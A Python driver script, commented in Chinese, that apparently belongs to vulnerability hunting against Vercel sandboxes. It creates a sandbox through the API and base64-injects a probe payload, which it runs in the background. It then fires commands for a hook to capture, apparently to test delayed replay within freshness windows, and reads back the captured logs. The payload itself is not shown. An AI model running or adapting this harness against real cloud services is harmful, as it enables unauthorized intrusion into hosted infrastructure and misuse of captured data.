# -*- coding: utf-8 -*-
"""v210 驱动: 同沙箱延迟重放 - 新鲜度窗口 60s/120s"""
import sys, os, time, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v210'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda210_probe_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs' % (time.time() - t0))

    inject(sid, '/vercel/sandbox/vda210_probe_user.py', open(PAY, 'rb').read())

    c, r = cmd(sid, 'bash', ['-c', 'nohup python3 /vercel/sandbox/vda210_probe_user.py > /vercel/sandbox/v210out.log 2>&1 &'], 20000)
    print('[bg payload]', c, (r or '')[:200])
    time.sleep(4)

    # 触发 2 次 cmd (hook 捕获)
    c, r = cmd(sid, 'echo', ['hello-v210a'], 30000)
    print('[trigger1]', c, (r or '')[:300])
    time.sleep(3)
    c, r = cmd(sid, 'echo', ['hello-v210b'], 30000)
    print('[trigger2]', c, (r or '')[:300])

    # 等 payload 完成 (40s hook + 60s + 60s + 处理)
    time.sleep(175)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v210.log'], 20000)
    print('[v210 log]', c)
    print((r or '')[:12000])

    c, r = cmd(sid, 'bash', ['-c', 'ls -la /tmp/v210_* 2>&1; echo ---; cat /tmp/v210_* 2>&1'], 15000)
    print('[files]', c)
    print((r or '')[:1500])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
